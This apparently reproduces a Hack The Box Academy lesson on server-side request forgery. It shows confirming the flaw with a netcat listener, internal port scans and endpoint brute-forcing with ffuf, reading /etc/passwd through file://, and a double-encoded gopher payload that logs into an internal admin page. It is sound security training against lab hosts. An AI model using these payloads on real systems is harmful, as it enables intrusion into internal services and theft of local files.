# Server-side Request Forgery Introduction
Suppose a web server fetches remote resources based on user input. In that case, an attacker might be able to coerce the server into making requests to arbitrary URLs supplied by the attacker, i.e., the web server is vulnerable to SSRF.

Furthermore, if the web application relies on a user-supplied URL scheme or protocol, an attacker might be able to cause even further undesired behavior by manipulating the URL scheme. For instance, the following URL schemes are commonly used in the exploitation of SSRF vulnerabilities:

- `http://` and `https://`: These URL schemes fetch content via HTTP/S requests. An attacker might use this in the exploitation of SSRF vulnerabilities to bypass WAFs, access restricted endpoints, or access endpoints in the internal network
- `file://`: This URL scheme reads a file from the local file system. An attacker might use this in the exploitation of SSRF vulnerabilities to read local files on the web server (LFI)
- `gopher://`: This protocol can send arbitrary bytes to the specified address. An attacker might use this in the exploitation of SSRF vulnerabilities to send HTTP POST requests with arbitrary payloads or communicate with other services such as SMTP servers or databases


# Identifying SSRF
## Confirming SSRF
After checking the availability of a date, we can observe the following request in Burp:

![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_identify_2.png)

As we can see, the request contains our chosen date and a URL in the parameter `dateserver`. This indicates that the web server fetches the availability information from a separate system determined by the URL passed in this POST parameter.

To confirm an SSRF vulnerability, let us supply a URL pointing to our system to the web application:

![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_identify_3.png)

In a `netcat` listener, we can receive a connection, thus confirming SSRF:

```shell-session
[!bash!]$ nc -lnvp 8000

listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38782
GET /ssrf HTTP/1.1
Host: 172.17.0.1:8000
Accept: */*
```

To determine whether the HTTP response reflects the SSRF response to us, let us point the web application to itself by providing the URL `http://127.0.0.1/index.php`:

![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_identify_4.png)

Since the response contains the web application's HTML code, the SSRF vulnerability is not blind, i.e., the response is displayed to us.

---

## Enumerating the System

We can use the SSRF vulnerability to conduct a port scan of the system to enumerate running services. To achieve this, we need to be able to infer whether a port is open or not from the response to our SSRF payload. If we supply a port that we assume is closed (such as `81`), the response contains an error message:

![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_identify_5.png)

This enables us to conduct an internal port scan of the web server through the SSRF vulnerability. We can do this using a fuzzer like `ffuf`. Let us first create a wordlist of the ports we want to scan. In this case, we'll use the first 10,000 ports:

```shell-session
[!bash!]$ seq 1 10000 > ports.txt
```

Afterward, we can fuzz all open ports by filtering out responses containing the error message we have identified earlier.

```shell-session
[!bash!]$ ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"

<SNIP>

[Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 0ms]
    * FUZZ: 3306
[Status: 200, Size: 8285, Words: 2151, Lines: 158, Duration: 338ms]
    * FUZZ: 80
```

The results show that the web server runs a service on port `3306`, typically used for a SQL database. If the web server ran other internal services, such as internal web applications, we could also identify and access them through the SSRF vulnerability.

# Exploiting SSRF
## Accessing Restricted Endpoints

As we have seen, the web application fetches availability information from the URL `dateserver.htb`. However, when we add this domain to our hosts file and attempt to access it, we are unable to do so:

   

![](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_exploit_1.png)

However, we can access and enumerate the domain through the SSRF vulnerability. For instance, we can conduct a directory brute-force attack to enumerate additional endpoints using `ffuf`. To do so, let us first determine the web server's response when we access a non-existing page:

![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_exploit_2.png)

As we can see, the web server responds with the default Apache 404 response. To also filter out any HTTP 403 responses, we will filter our results based on the string `Server at dateserver.htb Port 80`, which is contained in default Apache error pages. Since the web application runs PHP, we will specify the `.php` extension:

  Exploiting SSRF

```shell-session
alakin2504@htb[/htb]$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"

<SNIP>

[Status: 200, Size: 361, Words: 55, Lines: 16, Duration: 3872ms]
    * FUZZ: admin
[Status: 200, Size: 11, Words: 1, Lines: 1, Duration: 6ms]
    * FUZZ: availability
```

We have successfully identified an additional internal endpoint that we can now access through the SSRF vulnerability by specifying the URL `http://dateserver.htb/admin.php` in the `dateserver` POST parameter to potentially access sensitive admin information.

---

## Local File Inclusion (LFI)

As seen a few sections ago, we can manipulate the URL scheme to provoke further unexpected behavior. Since the URL scheme is part of the URL supplied to the web application, let us attempt to read local files from the file system using the `file://` URL scheme. We can achieve this by supplying the URL `file:///etc/passwd`

![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_exploit_3.png)

We can use this to read arbitrary files on the filesystem, including the web application's source code. For more details about exploiting LFI vulnerabilities, check out the [File Inclusion](https://academy.hackthebox.com/module/details/23) module.

---

## The gopher Protocol

As we have seen previously, we can use SSRF to access restricted internal endpoints. However, we are restricted to GET requests as there is no way to send a POST request with the `http://` URL scheme. For instance, let us consider a different version of the previous web application. Assuming we identified the internal endpoint `/admin.php` just like before, however, this time the response looks like this:

![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_exploit_4.png)

As we can see, the admin endpoint is protected by a login prompt. From the HTML form, we can deduce that we need to send a POST request to `/admin.php` containing the password in the `adminpw` POST parameter. However, there is no way to send this POST request using the `http://` URL scheme.

Instead, we can use the [gopher](https://datatracker.ietf.org/doc/html/rfc1436) URL scheme to send arbitrary bytes to a TCP socket. This protocol enables us to create a POST request by building the HTTP request ourselves.

Assuming we want to try common weak passwords, such as `admin`, we can send the following POST request:

Code: http

```http
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

We need to URL-encode all special characters to construct a valid gopher URL from this. In particular, spaces (`%20`) and newlines (`%0D%0A`) must be URL-encoded. Afterward, we need to prefix the data with the gopher URL scheme, the target host and port, and an underscore, resulting in the following gopher URL:

```
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

Our specified bytes are sent to the target when the web application processes this URL. Since we carefully chose the bytes to represent a valid POST request, the internal web server accepts our POST request and responds accordingly. However, since we are sending our URL within the HTTP POST parameter `dateserver`, which itself is URL-encoded, we need to URL-encode the entire URL again to ensure the correct format of the URL after the web server accepts it. Otherwise, we will get a `Malformed URL` error. After URL encoding the entire gopher URL one more time, we can finally send the following request:

```http
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

As we can see, the internal admin endpoint accepts our provided password, and we can access the admin dashboard:

![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_exploit_5.png)

We can use the `gopher` protocol to interact with many internal services, not just HTTP servers. Imagine a scenario where we identify, through an SSRF vulnerability, that TCP port 25 is open locally. This is the standard port for SMTP servers. We can use Gopher to interact with this internal SMTP server as well. However, constructing syntactically and semantically correct gopher URLs can take time and effort. Thus, we will utilize the tool [Gopherus](https://github.com/tarunkant/Gopherus) to generate gopher URLs for us. The following services are supported:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- SMTP
- Zabbix
- pymemcache
- rbmemcache
- phpmemcache
- dmpmemcache

# Blind SSRF

---

In many real-world SSRF vulnerabilities, the response is not directly displayed to us. These instances are called `blind` SSRF vulnerabilities because we cannot see the response. As such, all of the exploitation vectors discussed in the previous sections are unavailable to us because they all rely on us being able to inspect the response. Therefore, the impact of blind SSRF vulnerabilities is generally significantly lower due to the severely restricted exploitation vectors.

---

## Identifying Blind SSRF

The sample web application behaves just like in the previous section. We can confirm the SSRF vulnerability just like we did before by supplying a URL to a system under our control and setting up a `netcat` listener:

  Blind SSRF

```shell-session
alakin2504@htb[/htb]$ nc -lnvp 8000

listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 32928
GET /index.php HTTP/1.1
Host: 172.17.0.1:8000
Accept: */*
```

However, if we attempt to point the web application to itself, we can observe that the response does not contain the HTML response of the coerced request; instead, it simply lets us know that the date is unavailable. Therefore, this is a blind SSRF vulnerability:

![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_blind_1.png)

---

## Exploiting Blind SSRF

Exploiting blind SSRF vulnerabilities is generally severely limited compared to non-blind SSRF vulnerabilities. However, depending on the web application's behavior, we might still be able to conduct a (restricted) local port scan of the system, provided the response differs for open and closed ports. In this case, the web application responds with `Something went wrong!` for closed ports:

![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_blind_2.png)

However, if a port is open and responds with a valid HTTP response, we get a different error message:

![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_blind_3.png)

Depending on how the web application catches unexpected errors, we might be unable to identify running services that do not respond with valid HTTP responses. For instance, we are unable to identify the running MySQL service using this technique:

![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_blind_4.png)

Furthermore, while we cannot read local files like before, we can use the same technique to identify existing files on the filesystem. That is because the error message is different for existing and non-existing files, just like it differs for open and closed ports:

![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_blind_5.png)

For invalid files, the error message is different:

![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_blind_6.png)

VPN Servers